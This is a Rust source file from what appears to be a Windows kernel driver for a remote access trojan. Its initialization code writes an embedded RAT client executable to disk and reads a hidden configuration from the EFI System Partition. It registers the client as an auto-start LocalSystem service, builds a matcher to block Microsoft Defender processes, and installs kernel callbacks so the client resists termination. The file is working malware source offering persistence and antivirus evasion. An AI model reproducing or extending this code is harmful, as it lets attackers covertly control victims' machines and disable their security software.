pub mod cleanup;

use alloc::boxed::Box;
use alloc::collections::BTreeSet;
use alloc::{format, vec};
use core::ffi::c_void;
use core::sync::atomic::Ordering;
use core::{mem, ptr, slice};

use aho_corasick::AhoCorasickBuilder;
use const_format::formatcp;
use rat_common::utils::DropGuard;
use rat_common::windows::RAT_CLIENT_SERVICE_NAME;
use rat_common::windows::config::Config;
use rat_common::windows::kernel::KernelHandoff;
use rat_common::windows::utils::is_equal_guid;
use wdk::nt_success;
use wdk_sys::_MODE::KernelMode;
use wdk_sys::ntddk::{
    ExFreePool, IoGetDeviceInterfaces, KeDelayExecutionThread, RtlInitUnicodeString, ZwClose,
    ZwCreateFile, ZwCreateKey, ZwDeviceIoControlFile,
};
use wdk_sys::{
    FILE_NON_DIRECTORY_FILE, FILE_OPEN, FILE_SHARE_READ, FILE_SHARE_WRITE,
    FILE_SYNCHRONOUS_IO_NONALERT, GENERIC_READ, GENERIC_WRITE, HANDLE, IO_STATUS_BLOCK,
    KEY_ALL_ACCESS, LARGE_INTEGER, OBJ_CASE_INSENSITIVE, OBJ_KERNEL_HANDLE, OBJECT_ATTRIBUTES,
    REG_EXPAND_SZ, REG_OPTION_NON_VOLATILE, REG_SZ, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
    SERVICE_WIN32_OWN_PROCESS, STATUS_BUFFER_TOO_SMALL, SYNCHRONIZE, UNICODE_STRING,
};
use widestring::{U16CStr, U16CString, u16cstr};
use windows_sys::Win32::Storage::FileSystem::PARTITION_SYSTEM_GUID;
use windows_sys::Win32::System::Ioctl::{
    DRIVE_LAYOUT_INFORMATION_EX, GUID_DEVINTERFACE_DISK, IOCTL_DISK_GET_DRIVE_LAYOUT_EX,
    IOCTL_STORAGE_GET_DEVICE_NUMBER, PARTITION_INFORMATION_EX, PARTITION_STYLE_GPT,
    STORAGE_DEVICE_NUMBER,
};

use crate::global::{
    MAX_INITIALIZE_ATTEMPTS, MS_DEFENDER_AHO_CORASICK, MS_DEFENDER_PROCESS_PATTERN,
    OB_REGISTER_CALLBACKS_HANDLE, OBJ_PATH_AHO_CORASICK, ORIGINAL_DRIVER_OBJECT,
    PROCESS_NOTIFY_ROUTINE, RAT_CLIENT, RAT_CLIENT_FILE_PATH, RAT_CLIENT_OBJ_PATH_SELF_DEFENSE,
    RAT_CLIENT_SERVICE_PATH, RAT_CLIENT_SERVICE_REGISTRY, RAT_DEVICE_OBJECT, SELF_DEFENSE_PIDS,
};
use crate::handlers::{device, object, process};
use crate::utils::windows_to_wdk_guid;
use crate::wrappers::bindings::InitializeObjectAttributes;
use crate::wrappers::lock::SpinLock;
use crate::wrappers::{fs, registry};
use crate::{error, info};

pub unsafe extern "C" fn initialize_thread_routine(extra: *mut c_void) {
    let extra = unsafe { Box::from_raw(extra.cast()) };
    let mut sleep = LARGE_INTEGER { QuadPart: -3000000 }; // 300 ms

    for retry in 0..MAX_INITIALIZE_ATTEMPTS {
        info!(
            "Initialization attempt #{}/{MAX_INITIALIZE_ATTEMPTS}",
            retry + 1,
        );

        let status = unsafe { KeDelayExecutionThread(KernelMode as i8, 0, &mut sleep) };
        if !nt_success(status) {
            error!("KeDelayExecutionThread error: 0x{status:X}");
            break;
        }

        if initialize(&extra).is_ok() {
            return;
        }
    }

    error!("Failed to initialize after {MAX_INITIALIZE_ATTEMPTS} attempts");
}

fn read_config() -> anyhow::Result<Config> {
    let mut devices = ptr::null_mut();
    let status = unsafe {
        IoGetDeviceInterfaces(
            &windows_to_wdk_guid(GUID_DEVINTERFACE_DISK),
            ptr::null_mut(),
            0,
            &mut devices,
        )
    };

    anyhow::ensure!(
        nt_success(status),
        "IoGetDeviceInterfaces error: 0x{status:X}",
    );
    let guard = DropGuard::new(devices, |d| unsafe {
        ExFreePool(d.cast());
    });

    loop {
        let device_name = unsafe { U16CStr::from_ptr_str_mut(devices) };
        if device_name.is_empty() {
            break;
        }

        // Possible anti-debugging by checking device name e.g. "\\??\\SCSI#Disk&Ven_VBOX&Prod_HARDDISK#4&2617aeae&0&000000#{53f56307-b6bf-11d0-94f2-00a0c91efb8b}"
        info!("Found device interface: {:?}", device_name.display());
        devices = unsafe { devices.add(device_name.len().saturating_add(1)) };

        let mut device_str = UNICODE_STRING::default();
        let mut object_attributes = OBJECT_ATTRIBUTES::default();
        unsafe {
            RtlInitUnicodeString(&mut device_str, device_name.as_ptr());
            InitializeObjectAttributes(
                &mut object_attributes,
                &mut device_str,
                OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
                ptr::null_mut(),
                ptr::null_mut(),
            );
        }

        let mut status_block = IO_STATUS_BLOCK::default();

        let mut device = HANDLE::default();
        let status = unsafe {
            ZwCreateFile(
                &mut device,
                GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
                &mut object_attributes,
                &mut status_block,
                ptr::null_mut(),
                0,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                FILE_OPEN,
                FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
                ptr::null_mut(),
                0,
            )
        };

        anyhow::ensure!(nt_success(status), "ZwCreateFile error: 0x{status:X}");
        let guard = DropGuard::new(device, |h| unsafe {
            let _ = ZwClose(h);
        });

        let mut devno = STORAGE_DEVICE_NUMBER::default();
        let status = unsafe {
            ZwDeviceIoControlFile(
                device,
                ptr::null_mut(),
                None,
                ptr::null_mut(),
                &mut status_block,
                IOCTL_STORAGE_GET_DEVICE_NUMBER,
                ptr::null_mut(),
                0,
                (&raw mut devno).cast(),
                size_of::<STORAGE_DEVICE_NUMBER>().try_into()?,
            )
        };

        anyhow::ensure!(
            nt_success(status),
            "ZwDeviceIoControlFile error: 0x{status:X}",
        );

        let mut partitions_count = 4;

        fn _buffer_size(partitions_count: usize) -> usize {
            size_of::<PARTITION_INFORMATION_EX>()
                .saturating_mul(partitions_count)
                .saturating_add(size_of::<DRIVE_LAYOUT_INFORMATION_EX>())
        }
        let mut buffer = vec![0u8; _buffer_size(partitions_count)];

        loop {
            let status = unsafe {
                ZwDeviceIoControlFile(
                    device,
                    ptr::null_mut(),
                    None,
                    ptr::null_mut(),
                    &mut status_block,
                    IOCTL_DISK_GET_DRIVE_LAYOUT_EX,
                    ptr::null_mut(),
                    0,
                    buffer.as_mut_ptr().cast(),
                    buffer.len().try_into()?,
                )
            };

            if nt_success(status) {
                if let Some(result) = unsafe {
                    buffer
                        .as_ptr()
                        .cast::<DRIVE_LAYOUT_INFORMATION_EX>()
                        .as_ref()
                } {
                    let partitions = result.PartitionEntry.as_ptr();
                    for index in 0..result.PartitionCount {
                        let index = usize::try_from(index)?;
                        if let Some(partition) = unsafe { partitions.add(index).as_ref() }
                            && partition.PartitionStyle == PARTITION_STYLE_GPT
                        {
                            let gpt = &unsafe { partition.Anonymous.Gpt };
                            if is_equal_guid(&gpt.PartitionType, &PARTITION_SYSTEM_GUID) {
                                let path = format!(
                                    "\\Device\\Harddisk{}\\Partition{}\\EFI\\Microsoft\\Boot\\config.json",
                                    devno.DeviceNumber,
                                    index + 1, // Index 0 is the physical disk itself e.g. "\Device\Harddisk0\DR0"
                                );
                                info!("Reading config from {path:?}");

                                let u16path = U16CString::from_str_truncate(&path);
                                let file = fs::File::open(u16path.as_ptr())?;

                                let mut content = vec![];
                                let mut buffer = [0; 1024];
                                loop {
                                    let bytes = file.read(&mut buffer)?;
                                    if bytes == 0 {
                                        break;
                                    }

                                    let bytes = usize::try_from(bytes)?;
                                    content.extend_from_slice(&buffer[..bytes]);
                                }

                                return serde_json::from_slice::<Config>(&content).map_err(|e| {
                                    anyhow::anyhow!("Failed to parse config JSON: {e}")
                                });
                            }
                        }
                    }
                }

                break;
            } else if status == STATUS_BUFFER_TOO_SMALL {
                partitions_count = partitions_count.saturating_mul(2);
                buffer.resize(_buffer_size(partitions_count), 0);
            } else {
                anyhow::bail!("ZwDeviceIoControlFile error: 0x{status:X}");
            }
        }

        drop(guard);
    }

    drop(guard);
    anyhow::bail!("Cannot find EFI System Partition");
}

fn setup_service_registry(config: &Config) -> anyhow::Result<()> {
    let mut attributes = OBJECT_ATTRIBUTES::default();
    let mut root_directory = UNICODE_STRING::default();
    unsafe {
        RtlInitUnicodeString(&mut root_directory, RAT_CLIENT_SERVICE_REGISTRY.as_ptr());
        InitializeObjectAttributes(
            &mut attributes,
            &mut root_directory,
            OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
            ptr::null_mut(),
            ptr::null_mut(),
        );
    }

    let mut key = HANDLE::default();
    let status = unsafe {
        ZwCreateKey(
            &mut key,
            KEY_ALL_ACCESS,
            &mut attributes,
            0,
            ptr::null_mut(),
            REG_OPTION_NON_VOLATILE,
            ptr::null_mut(),
        )
    };
    anyhow::ensure!(nt_success(status), "ZwCreateKey error: 0x{status:X}");

    let guard = DropGuard::new(key, |key| unsafe {
        let _ = ZwClose(key);
    });

    let path = format!("\"{RAT_CLIENT_SERVICE_PATH}\" {}", config.argument);
    let u_path = U16CString::from_str(&path)
        .map_err(|_| anyhow::anyhow!("Cannot convert {path:?} to U16CString"))?;

    // Reference: https://learn.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree
    for status in [
        registry::registry_write_string(
            key,
            u16cstr!("DisplayName"),
            u16cstr!(formatcp!("{RAT_CLIENT_SERVICE_NAME} Service")),
            REG_SZ,
        ),
        registry::registry_write_string(
            key,
            u16cstr!("Description"),
            u16cstr!(formatcp!("{RAT_CLIENT_SERVICE_NAME} Service")),
            REG_SZ,
        ),
        registry::registry_write_string(key, u16cstr!("ImagePath"), &u_path, REG_EXPAND_SZ),
        registry::registry_write_dword(key, u16cstr!("Type"), SERVICE_WIN32_OWN_PROCESS),
        registry::registry_write_dword(key, u16cstr!("Start"), SERVICE_AUTO_START),
        registry::registry_write_dword(key, u16cstr!("ErrorControl"), SERVICE_ERROR_NORMAL),
        registry::registry_write_string(
            key,
            u16cstr!("ObjectName"),
            u16cstr!("LocalSystem"),
            REG_SZ,
        ),
    ] {
        anyhow::ensure!(nt_success(status), "ZwSetValueKey error: 0x{status:X}");
    }

    let _ = registry::registry_delete_value(key, u16cstr!("DeleteFlag"));

    drop(guard);
    Ok(())
}

fn drop_file() -> anyhow::Result<()> {
    let file = fs::File::create(RAT_CLIENT_FILE_PATH.as_ptr())?;
    file.write(RAT_CLIENT)?;

    Ok(())
}

/// Interpret as a `&[u8]` slice for aho-corasick
fn u16cstr_to_buf(u16cstr: &U16CStr) -> &[u8] {
    unsafe {
        slice::from_raw_parts(
            u16cstr.as_ptr().cast(),
            u16cstr.len() * mem::size_of::<u16>(),
        )
    }
}

fn initialize(extra: &KernelHandoff) -> anyhow::Result<()> {
    // Drop client executable
    drop_file().inspect_err(|e| {
        error!("Failed to drop RAT client: {e}");
    })?;

    // Fetch config
    let config = read_config().inspect_err(|e| {
        error!("Failed to read config file: {e}");
    })?;

    // Create service registry key
    setup_service_registry(&config).inspect_err(|e| {
        error!("Failed to setup service registry: {e}");
    })?;

    // Create Aho-Corasick automaton for MS Defender block
    let ac = AhoCorasickBuilder::new()
        .ascii_case_insensitive(true)
        .build(
            MS_DEFENDER_PROCESS_PATTERN
                .iter()
                .map(|p| u16cstr_to_buf(p)),
        )
        .map_err(|e| {
            error!("Failed to build Aho-Corasick automaton for MS Defender block: {e}");
            anyhow::anyhow!("Aho-Corasick build error: {e}")
        })?;
    cleanup::cleanup_aho_corasick(
        MS_DEFENDER_AHO_CORASICK.swap(Box::into_raw(Box::new(ac)), Ordering::AcqRel),
    );

    // Create Aho-Corasick automaton for self-defense
    let ac = AhoCorasickBuilder::new()
        .ascii_case_insensitive(true)
        .build([u16cstr_to_buf(RAT_CLIENT_OBJ_PATH_SELF_DEFENSE)])
        .map_err(|e| {
            error!("Failed to build Aho-Corasick automaton for object path: {e}");
            anyhow::anyhow!("Aho-Corasick build error: {e}")
        })?;
    cleanup::cleanup_aho_corasick(
        OBJ_PATH_AHO_CORASICK.swap(Box::into_raw(Box::new(ac)), Ordering::AcqRel),
    );

    // Register object callbacks for self-defense
    let ob = object::ob_register_callbacks(extra).inspect_err(|e| {
        error!("Failed to register object callbacks: {e}");
    })?;
    cleanup::cleanup_object_callbacks(OB_REGISTER_CALLBACKS_HANDLE.swap(ob, Ordering::AcqRel));

    // Register process creation/deletion callback
    let ps = process::ps_set_create_process_notify_routine_ex(extra).inspect_err(|e| {
        error!("Failed to register process callbacks: {e}");
    })?;
    cleanup::cleanup_process_notify_routine(
        PROCESS_NOTIFY_ROUTINE.swap(ps as *mut u8, Ordering::AcqRel),
    );

    // Construct data structure to track self-defense PIDs
    let pids = Box::into_raw(Box::new(SpinLock::new(BTreeSet::new())));
    cleanup::cleanup_self_defense_pids(SELF_DEFENSE_PIDS.swap(pids, Ordering::AcqRel));

    // Create device object
    let driver = ORIGINAL_DRIVER_OBJECT.load(Ordering::Acquire);
    let device = device::create_device(driver).inspect_err(|e| {
        error!("Failed to create device object: {e}");
    })?;
    cleanup::cleanup_device(RAT_DEVICE_OBJECT.swap(device, Ordering::AcqRel));

    Ok(())
}
